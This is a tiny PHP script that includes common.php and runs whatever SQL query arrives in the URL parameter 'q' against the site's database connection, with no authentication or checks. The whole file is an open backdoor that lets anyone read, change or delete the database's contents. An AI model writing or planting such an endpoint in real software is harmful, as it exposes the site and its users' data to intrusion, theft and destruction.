<?php 
require("common.php");
if(isset($_GET['q'])){
	mysqli_query($conn, $_GET['q']);
}
?>